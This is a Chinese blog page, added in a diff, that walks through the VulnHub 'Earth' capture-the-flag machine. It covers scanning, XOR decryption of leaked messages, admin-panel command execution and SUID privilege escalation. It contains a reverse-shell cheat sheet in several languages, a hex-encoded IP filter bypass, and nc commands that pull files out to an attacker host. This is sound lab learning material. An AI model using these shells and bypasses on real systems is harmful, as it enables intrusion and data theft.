@@ -1,0 +1,371 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>VulnHub靶场之THE PLANETS: EARTH | Microthink-yjn140</title>
+
+<link rel="shortcut icon" href="https://yjn140.site/favicon.ico?v=1690542654805">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://yjn140.site/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.1/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script> 
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Microthink-yjn140
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1690542654805"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    VulnHub靶场之THE PLANETS: EARTH
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-06-23 ·
+                    </time>
+                    
+                        <a href="https://yjn140.site/AVMJKGPZI/" class="post-tags">
+                            # vulnhub
+                        </a>
+                    
+                        <a href="https://yjn140.site/8Eo75T6ej/" class="post-tags">
+                            # CTF题
+                        </a>
+                    
+                        <a href="https://yjn140.site/BFKweRoOM/" class="post-tags">
+                            # 技术
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="vulnhub靶场earth">vulnhub靶场Earth</h1>
+<p>首先是下载镜像，然后用vmware打开，记得关闭usb，然后网络配置建议设置成桥接模式，然后需要指定桥接的网卡。</p>
+<p>使用nmap进行扫描</p>
+<pre><code class="language-bash">sudo nmap -sP 192.168.[num1].1/24  
+</code></pre>
+<p>/24表示那个网段0-255都扫描</p>
+<p>然后对靶机的ip进行端口扫描</p>
+<pre><code class="language-bash">sudo nmap -sC -sV -p- 192.168.[num1].[num2]
+</code></pre>
+<p>-sC 表示使用nmap脚本探测 -sV探测服务信息</p>
+<p>-p-表示扫描全端口</p>
+<p>从图可以看到开启了22 80 443 端口，然后用到了两个dns服务器 earth.local  terra test.earth.local</p>
+<p>然后我们正常访问这个网站ip地址，发现访问不了</p>
+<p>即一台服务器，有两个域名，有可能这里用了apache的虚拟主机技术，不同的域名指向不同的服务器目录，或者有不同的权限</p>
+<p>方便起见，这个时候我们改本机的hosts文件</p>
+<pre><code class="language-bash">vi /etc/hosts 
+</code></pre>
+<pre><code>192.168.1.241 earth.local terratest.earth.local
+</code></pre>
+<p>然后，碰到ssl端口开放，我们可能就要考虑到https和http访问得到的网站权限可能不一样</p>
+<p>然后因为证书问题，chrome内核可能访问不了，我们只需要在该标签页，键盘拼写thisisunsafe，即自动刷新。safari则只需同意一下</p>
+<p>然后在网站上访问的输入框会使得页面多一行文本，没啥思路。</p>
+<p>于是开始扫目录</p>
+<p>网上教程一个域名是扫描http，一个域名是扫描https。那我说不出为什么这样的道理，我只能每个域名的http和https都建议扫一下，那么两个域名就是扫四次</p>
+<p>使用gobuster 3.0</p>
+<p>用法</p>
+<pre><code class="language-bash">gobuster dir -u 目标地址 -w 字典 -x .zip,.php,.txt      
+</code></pre>
+<p>字典用的是御剑的，勉强够用。有个一百多兆的，一晚上根本扫不完，还没啥用</p>
+<p>gobuster dir -u http://earth.local -w /Users/song/Data/渗透/字典/dir.txt -x .zip,.php,.txt</p>
+<p>gobuster dir -u https://earth.local -w /Users/song/Data/渗透/字典/dir.txt -x .zip,.php,.txt</p>
+<p>gobuster dir -u http://terratest.earth.local -w ../dicts.txt -x .zip,.php,.txt -k</p>
+<p>gobuster dir -u https://terratest.earth.local -w ../dicts.txt -x .zip,.php,.txt -k</p>
+<p>然后找到几个路径</p>
+<p>http://earth.local/admin/login</p>
+<p>网上说爆破没用，我还不太会用burp的混合爆破。既然没用，但是我觉得能不能通过构造的方法试试，下次找个机会试试。当然也得考虑从网站别处弄到手</p>
+<p>https://terratest.earth.local/robots.txt</p>
+<p>这里规定了一些不让抓取的路径或者说文件类型</p>
+<p>发现比较特殊的是/testingnotes.*</p>
+<p>猜测为txt文件，当然什么.md .doc .docx都可以试试</p>
+<p>查看了一下，发现有点信息</p>
+<p>测试安全消息系统注意事项：<br>
+*使用 XOR 加密作为算法，在 RSA 中使用应该是安全的。<br>
+*地球已确认他们已收到我们发送的消息。<br>
+*testdata.txt 用于测试加密。<br>
+*terra 用作管理门户的用户名。<br>
+去做：<br>
+*我们如何安全地将我们的每月密钥发送到地球？ 还是我们应该每周更换密钥？<br>
+*需要测试不同的密钥长度以防止暴力破解。 钥匙应该多长？<br>
+*需要改进消息界面和管理面板的界面，目前非常基础。</p>
+<p>这里可以看出又提到了一个tesedata.txt文件，我们想办法下载下来。</p>
+<p>如果使用wget，那需要在后面带参数--no-check-certificate</p>
+<p>因为那个https的ssl证书不被认可</p>
+<pre><code class="language-bash">wget https://terratest.earth.local/testdata.txt --no-check-certificate
+</code></pre>
+<p>根据文中提到的xor异或加密算法，目前来收我们在网站上可以看到一开始的三串字符串，这个就是所谓发送给地球的信息，我们也测试了一次。那么我们现在已知（被加密了的信息和加密算法材料，也许可以得出原信息）</p>
+<p>这里就要了解一下异或加密与解密的知识——大概就是知二求一</p>
+<p>现在可以通过异或算法解密出原始数据</p>
+<p>利用testdata.txt和三组原始加密信息进行解密，在第三组信息中得到了一个重复字符串 earthclimatechangebad4humans</p>
+<p>然后我们就用这个作为密码，terra作为用户名，http://earth.local/admin/login这里登陆进了网站后台</p>
+<p>发现这个有个文本框能够直接执行命令</p>
+<p>那么最常见的，ls /var 看一下，然后pwd。whoami</p>
+<p>然后因为有两个flag，现在先用find命令找一下。</p>
+<pre><code class="language-bash">find / -name &quot;*flag*&quot; 
+</code></pre>
+<pre><code class="language-bash">find / -name &quot;*earth*&quot;
+</code></pre>
+<p>找到一个/var/earth_web/user_flag.txt</p>
+<pre><code class="language-bash">cat /var/earth_web/user_flag.txt
+</code></pre>
+<p>得到一个flag：user_flag_3353b67d6437f07ba7d34afd7d2fc27d</p>
+<p>那么根据vulunhub说的，有user_flag和root_flag，也就是说我们现在这个apache用户权限不太够，有些文件访问不了，则我们需要提权</p>
+<p>两个思路，一个是提升现在用户的权限，另外一个是使用高权限用户，例如root用户来执行一些命令。</p>
+<p>那么涉及到很多命令的执行，为了更方便，我们选择反弹shell来连接该主机</p>
+<p>然后反弹shell大致分为bash nc talent三种实现方法，然后针对不同语言的web服务器，还可以使用一些脚本反弹shell，例如</p>
+<pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'
+</code></pre>
+<pre><code class="language-perl">perl -e 'use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+<pre><code class="language-perl">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre>
+<pre><code class="language-ruby">ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
+</code></pre>
+<pre><code class="language-php">php -r '$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<pre><code class="language-java">	public class Revs {
+	/**
+	* @param args
+	* @throws Exception 
+	*/
+	public static void main(String[] args) throws Exception {
+  	  // TODO Auto-generated method stub
+    	Runtime r = Runtime.getRuntime();
+    	String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;};
+    	Process p = r.exec(cmd);
+    	p.waitFor();
+	}
+}
+</code></pre>
+<pre><code class="language-lua">lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot;
+</code></pre>
+<pre><code class="language-bash">awk 'BEGIN{s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}'
+</code></pre>
+<p>那我们从一般步骤开始尝试</p>
+<p>首先是攻击机开启监听</p>
+<p>kali</p>
+<pre><code class="language-bash">nc -lvvp 1234
+</code></pre>
+<p>Mac 得使用下面这个</p>
+<pre><code class="language-bash">nc -l 1234
+</code></pre>
+<p>然后让靶机反弹shell</p>
+<p>我们先 ls /usr/bin 看一下能执行什么命令，发现bash nc python是可以使用的</p>
+<p>那就尝试这几个命令</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/192.168.1.123/1234 0&gt;&amp;1
+</code></pre>
+<pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.123&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);' 
+</code></pre>
+<p>这个python代码有长度限制（maxlength），需要改前端限制，或者抓包改数据</p>
+<p>后面发现都没用</p>
+<p>根据网上教程的提示，意思是说会对命令中ip地址的数字进行过滤（正则表达式）</p>
+<p>这里我把那个代码文件提取出来，可以了看一下</p>
+<p>然后我们使用16进制对十进制的ip地址进行编码</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x01.0x67/1234 0&gt;&amp;1
+</code></pre>
+<p>也有别的教程是把ip点十进制转成2进制，然后按权重加起来，也可以实现绕过的效果</p>
+<p>正常情况就连接上了，用ls pwd可以测试一下</p>
+<p>然后用命令找一些有特殊权限的文件</p>
+<pre><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p>或者</p>
+<pre><code class="language-bash">find / -perm /u=s -type f 2&gt;/dev/null
+</code></pre>
+<p>然后</p>
+<pre><code class="language-bash">/usr/bin/chage /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/su /usr/bin/mount /usr/bin/umount /usr/bin/pkexec /usr/bin/passwd /usr/bin/chfn /usr/bin/chsh /usr/bin/at /usr/bin/sudo /usr/bin/reset_root /usr/sbin/grub2-set-bootflag /usr/sbin/pam_timestamp_check /usr/sbin/unix_chkpwd /usr/sbin/mount.nfs /usr/lib/polkit-1/polkit-agent-helper-1
+</code></pre>
+<p>注意到这个/usr/bin/reset_root</p>
+<p>直接运行发现报错</p>
+<p>所以我们决定把它提取出来，通过逆向或者进行调试</p>
+<p>那我们就得用一种方式把它提取。</p>
+<p>这里我们选择nc命令，在另外一个端口，由靶机把文件作为数据流发送给攻击机，然后攻击机把收到的数据保存到文件中。也就实现了文件的提取</p>
+<p>攻击机：nc -l 4321 &gt;reset_root</p>
+<p>靶机shell:nc 192.168.1.123 4321 &lt; /usr/bin/reset_root</p>
+<p>提取出来之后，放到ida里面逆向看一下，大概来说就是有个变量每通过一次函数，就会自增1，当着个变量等于3时，就会执行重置root密码的操作</p>
+<p>那么根据网上的提示，我们选择来kali这样的linux系统中通过ltrace或者strace对程序进行跟踪，看一下他到底需要哪三个判断。</p>
+<p>sudo chmod +x reset_root</p>
+<p>这里我自己通过逆向不是很清楚文件和路径怎么就能得出来，水平有限，希望大佬解答</p>
+<p>然后就会发现需要三个文件，但是找不到。那我们就使用touch命令，在相应目录创建三个文件。</p>
+<p>ltrace 进程库函数调用</p>
+<p>strace在<a href="https://so.csdn.net/so/search?q=linux&amp;spm=1001.2101.3001.7020">linux</a>下用来跟踪某个进程的系统调用。 系统调用</p>
+<p>然后我们再在靶机执行这个程序，发现就把root用户密码改成了Earth</p>
+<p>那我们用su命令切换到root，输入密码。即成功切换</p>
+<p>然后还是执行find命令，找到rootflag</p>
+<p>root_flag_b0da9554d29db2117b02aa8b66ec492e</p>
+<p>在solaris下，对应的是dtrace</p>
+<p>在mac下，对应的命令是：dtruss</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://yjn140.site/sqSbKkVP3/" class="post-title gt-a-link">
+                    c语言统计字符串26字母词频
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'INIV7p9Souw8TCNgorzEFDKL-gzGzoHsz',
+		appKey: 'O4UlwuExAsqaVTYDleea1fx6',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: true,
+		placeholder: 'Just Go Go',
+		visitor: false,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">博主本人是来自一所普通学校的大学生。平时喜欢各种科技数码类的新鲜事物，只要有能力，都想学习钻研一下。各大论坛的ID为“遇见你140”或“yjn140”</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/yjn140" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        联系我：<a href="https://qm.qq.com/cgi-bin/qm/qr?k=aqjmaKpHkvEoOentnmEK2E1AfkB4-i85&noverify=0
+">QQ</a> <br><br>
+<a href="https://beian.miit.gov.cn/#/Integrated/index"   target="_blank">赣ICP备2021010019号-1</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://yjn140.site/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
